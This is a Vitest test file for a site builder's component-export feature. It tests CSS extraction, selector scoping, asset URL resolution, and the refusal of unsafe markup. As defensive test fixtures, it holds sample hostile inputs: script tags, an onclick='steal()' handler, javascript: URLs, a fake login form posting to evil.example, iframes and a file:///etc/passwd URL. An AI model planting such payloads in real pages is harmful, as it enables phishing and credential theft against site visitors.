// The extraction pipeline is what the whole sharing idea rests on: a block
// that arrives at its new home looking like a naked <ul> is worse than no
// feature at all. So what is pinned here is fidelity (everything that decides
// how it looks travels), isolation (and nothing else does), and refusal (what
// must never travel at all).
import { beforeEach, describe, expect, it } from 'vitest'
import {
  SHARED_SCOPE_ATTR,
  absoluteAssetUrl,
  auditSharedHtml,
  exportComponent,
  matchableSelector,
  scopeSelector,
  sharedBlockHtml,
} from './componentExport.js'

function page(html, css) {
  document.head.innerHTML = `<style id="page">${css}</style>`
  document.body.innerHTML = html
  return document.body.firstElementChild
}

beforeEach(() => {
  document.head.innerHTML = ''
  document.body.innerHTML = ''
})

describe('matchableSelector', () => {
  it('drops the states that stop a selector matching, keeping the rule', () => {
    // `.btn:hover` styles the block but never matches an un-hovered element.
    expect(matchableSelector('.btn:hover')).toBe('.btn')
    expect(matchableSelector('.card::after')).toBe('.card')
    expect(matchableSelector('a:focus-visible')).toBe('a')
  })

  it('keeps the pseudo-classes that describe what an element IS', () => {
    expect(matchableSelector('li:first-child')).toBe('li:first-child')
    expect(matchableSelector('li:nth-child(2)')).toBe('li:nth-child(2)')
    expect(matchableSelector('div:not(.x)')).toBe('div:not(.x)')
  })
})

describe('scopeSelector', () => {
  it('reaches the root and its descendants, and nothing outside', () => {
    expect(scopeSelector('.menu', 's1')).toBe(`[${SHARED_SCOPE_ATTR}="s1"].menu, [${SHARED_SCOPE_ATTR}="s1"] .menu`)
  })

  it('pins page-level selectors to the block so they cannot escape', () => {
    // A shared block must never restyle its host's <body>.
    expect(scopeSelector('body', 's1')).toBe(`[${SHARED_SCOPE_ATTR}="s1"]`)
    expect(scopeSelector(':root', 's1')).toBe(`[${SHARED_SCOPE_ATTR}="s1"]`)
  })

  it('handles selector lists', () => {
    expect(scopeSelector('.a, .b', 's1')).toContain('.a')
    expect(scopeSelector('.a, .b', 's1')).toContain('.b')
  })
})

describe('exportComponent — what travels', () => {
  it('brings the rules that style the block', () => {
    const el = page(
      '<nav class="menu"><a class="link" href="#a">Home</a></nav>',
      '.menu { display: flex; gap: 20px; } .link { color: rebeccapurple; }',
    )
    const out = exportComponent(document, el)

    expect(out.ok).toBe(true)
    expect(out.css).toContain('display: flex')
    expect(out.css).toContain('rebeccapurple')
  })

  it('leaves behind the rules that do not', () => {
    // The sibling has to EXIST in the page: a rule matching nothing at all
    // would be dropped by any implementation, so a test using one proves
    // nothing. This is the real question — a rule that matches something else
    // on the same page.
    document.head.innerHTML = `<style>
      .menu { display: flex; }
      .unrelated { font-size: 77px; }
      @media (max-width: 767px) { .menu { flex-direction: column; } .unrelated { color: teal; } }
    </style>`
    document.body.innerHTML = '<nav class="menu"><a class="link" href="#a">Home</a></nav><p class="unrelated">no</p>'
    const out = exportComponent(document, document.body.firstElementChild)

    expect(out.css).toContain('flex')
    expect(out.css, 'a sibling’s rule must not travel').not.toContain('unrelated')
    expect(out.css).not.toContain('77px')
    // …not even when it shares a media query with a rule that DID match.
    expect(out.css).not.toContain('teal')
  })

  it('brings an animation the block uses, and no others', () => {
    document.head.innerHTML = `<style>
      .card { animation: floaty 2s infinite; }
      @keyframes floaty { from { transform: none } to { transform: translateY(-4px) } }
      @keyframes unusedAnim { from { opacity: 0 } to { opacity: 1 } }
    </style>`
    document.body.innerHTML = '<div class="card">x</div>'
    const out = exportComponent(document, document.body.firstElementChild)

    expect(out.css).toContain('floaty')
    expect(out.css).not.toContain('unusedAnim')
  })

  it('does not carry the page’s own body rule onto the host', () => {
    const el = page('<div class="card">x</div>', 'body { font-family: Georgia; } .card { padding: 4px; }')
    expect(exportComponent(document, el).css).not.toMatch(/(^|\s)body\s*\{/)
  })

  it('scopes what it brings, so it cannot collide with the host', () => {
    const el = page('<div class="card">x</div>', '.card { padding: 20px; }')
    const out = exportComponent(document, el, { scope: 'abc' })

    expect(out.css).toContain(`[${SHARED_SCOPE_ATTR}="abc"]`)
    expect(out.html).toContain(`${SHARED_SCOPE_ATTR}="abc"`)
    // The bare selector must not survive — that is what would restyle the
    // host's own .card.
    expect(out.css).not.toMatch(/(^|\n)\s*\.card\s*\{/)
  })

  it('keeps the responsive behaviour, which is part of the component', () => {
    const el = page(
      '<nav class="menu"><a class="link" href="#a">Home</a></nav>',
      '.menu { display: flex; } @media (max-width: 767px) { .menu { flex-direction: column; } }',
    )
    const out = exportComponent(document, el)

    expect(out.css).toContain('@media')
    expect(out.css).toContain('max-width: 767px')
    expect(out.css).toContain('column')
    // …and the rule inside the query is scoped too.
    expect(out.css.split('@media')[1]).toContain(SHARED_SCOPE_ATTR)
  })

  it('carries the custom properties its rules read', () => {
    // The definition lives on :root, which is NOT part of the subtree — miss
    // it and every colour falls back to nothing.
    const el = page(
      '<div class="card">x</div>',
      ':root { --accent: #9a6b4f; --ink: #2c2520; } .card { color: var(--accent); border: 1px solid var(--ink); }',
    )
    const out = exportComponent(document, el, { scope: 'v1' })

    expect(out.css).toContain('--accent: #9a6b4f')
    expect(out.css).toContain('--ink: #2c2520')
    // Defined ON the block, so the host's own --accent is untouched.
    expect(out.css).toContain(`[${SHARED_SCOPE_ATTR}="v1"] {`)
  })

  it('does not carry custom properties nothing reads', () => {
    const el = page('<div class="card">x</div>', ':root { --unused: #123456; } .card { padding: 4px; }')
    expect(exportComponent(document, el).css).not.toContain('--unused')
  })

  it('names the fonts rather than linking somebody else’s stylesheet', () => {
    const el = page('<div class="card">x</div>', '.card { font-family: "Playfair Display", serif; }')
    const out = exportComponent(document, el)

    expect(out.css).toContain('Playfair Display')
    // No <link> to the source site's font CSS — the host decides how to load it.
    expect(out.html).not.toContain('<link')
    expect(Array.isArray(out.fonts)).toBe(true)
  })

  it('resolves images against the site they came from', () => {
    const el = page('<figure class="f"><img src="/media/photo.jpg" /></figure>', '.f { margin: 0; }')
    const out = exportComponent(document, el)

    expect(out.html).toContain('http')
    expect(out.html).not.toContain('"/media/photo.jpg"')
    expect(out.assets.length).toBe(1)
  })

  it('drops a srcset rather than shipping one resolved against the wrong origin', () => {
    const el = page('<figure class="f"><img src="/a.jpg" srcset="/a.jpg 1x, /a@2x.jpg 2x" /></figure>', '.f { margin: 0; }')
    expect(exportComponent(document, el).html).not.toContain('srcset')
  })

  it('never touches the page it exported from', () => {
    const el = page('<div class="card"><img src="/a.jpg" /></div>', '.card { padding: 4px; }')
    exportComponent(document, el, { scope: 'zz' })

    expect(el.hasAttribute(SHARED_SCOPE_ATTR)).toBe(false)
    expect(el.querySelector('img').getAttribute('src')).toBe('/a.jpg')
  })

  it('reports what it could not read instead of silently shipping less', () => {
    const el = page('<div class="card">x</div>', '.card { padding: 4px; }')
    // A cross-origin sheet throws on cssRules; jsdom lets us stand one in.
    Object.defineProperty(document, 'styleSheets', {
      configurable: true,
      value: [
        ...document.styleSheets,
        { href: 'https://fonts.googleapis.com/css2', get cssRules() { throw new Error('cross-origin') } },
      ],
    })
    const out = exportComponent(document, el)
    delete document.styleSheets

    expect(out.ok).toBe(true)
    expect(out.warnings.some((w) => w.kind === 'blocked-stylesheet')).toBe(true)
  })
})

describe('exportComponent — what is refused', () => {
  const refuses = (html) => {
    const el = page(html, '.x { color: red; }')
    return exportComponent(document, el)
  }

  it('refuses a script, rather than stripping it quietly', () => {
    const out = refuses('<div class="x"><script>alert(1)</script></div>')
    expect(out.ok).toBe(false)
    expect(out.problems.some((p) => p.kind === 'script')).toBe(true)
  })

  it('refuses inline handlers', () => {
    const out = refuses('<div class="x"><button onclick="steal()">Go</button></div>')
    expect(out.ok).toBe(false)
    expect(out.problems.some((p) => p.kind === 'handler')).toBe(true)
  })

  it('refuses javascript: urls', () => {
    const out = refuses('<div class="x"><a href="javascript:alert(1)">Go</a></div>')
    expect(out.ok).toBe(false)
    expect(out.problems.some((p) => p.kind === 'url')).toBe(true)
  })

  it('refuses a form that posts somewhere else — the phishing shape', () => {
    // The sandbox stops a script reading the host's data. It does nothing
    // about a convincing fake login form, and that is the real risk once the
    // author is not the site owner.
    const out = refuses('<div class="x"><form action="https://evil.example/login"><input name="p"></form></div>')
    expect(out.ok).toBe(false)
    expect(out.problems.some((p) => p.kind === 'form')).toBe(true)
  })

  it('allows a form that stays on the page', () => {
    const el = page('<div class="x"><form action="#"><input name="q"></form></div>', '.x { color: red; }')
    expect(exportComponent(document, el).ok).toBe(true)
  })

  it('refuses iframes and plugin elements', () => {
    expect(refuses('<div class="x"><iframe src="https://evil.example"></iframe></div>').ok).toBe(false)
    expect(refuses('<div class="x"><object data="a.swf"></object></div>').ok).toBe(false)
  })

  it('lets scripts through only when explicitly allowed', () => {
    const el = page('<div class="x"><script>ok()</script></div>', '.x { color: red; }')
    expect(exportComponent(document, el, { allowScripts: true }).ok).toBe(true)
  })

  it('refuses nothing at all', () => {
    expect(exportComponent(document, null).ok).toBe(false)
    expect(exportComponent(null, null).ok).toBe(false)
  })
})

describe('auditSharedHtml', () => {
  it('says what is wrong, not just that something is', () => {
    document.body.innerHTML = '<div><button onclick="x()">a</button><iframe src="https://e.test"></iframe></div>'
    const problems = auditSharedHtml(document.body.firstElementChild)

    expect(problems).toHaveLength(2)
    expect(problems.map((p) => p.kind).sort()).toEqual(['handler', 'iframe'])
    expect(problems.every((p) => p.detail)).toBe(true)
  })
})

describe('absoluteAssetUrl', () => {
  const base = 'https://arda.sitebuilder.local/page'

  it('resolves relative paths against the source site', () => {
    expect(absoluteAssetUrl('/media/a.jpg', base)).toBe('https://arda.sitebuilder.local/media/a.jpg')
    expect(absoluteAssetUrl('img/b.png', base)).toBe('https://arda.sitebuilder.local/img/b.png')
  })

  it('leaves absolute and data URLs alone', () => {
    expect(absoluteAssetUrl('https://cdn.test/a.png', base)).toBe('https://cdn.test/a.png')
    expect(absoluteAssetUrl('data:image/png;base64,AAA', base)).toBe('data:image/png;base64,AAA')
  })

  it('refuses script and file URLs', () => {
    expect(absoluteAssetUrl('javascript:alert(1)', base)).toBe('')
    expect(absoluteAssetUrl('file:///etc/passwd', base)).toBe('')
  })
})

describe('sharedBlockHtml', () => {
  it('is one self-contained block: its styles, then its markup', () => {
    const out = sharedBlockHtml({ html: '<div>x</div>', css: '.a { color: red; }' })
    expect(out.indexOf('<style>')).toBeLessThan(out.indexOf('<div>'))
    expect(out).toContain('color: red')
  })

  it('skips the style tag when there is nothing to say', () => {
    expect(sharedBlockHtml({ html: '<div>x</div>', css: '' })).toBe('<div>x</div>')
  })
})
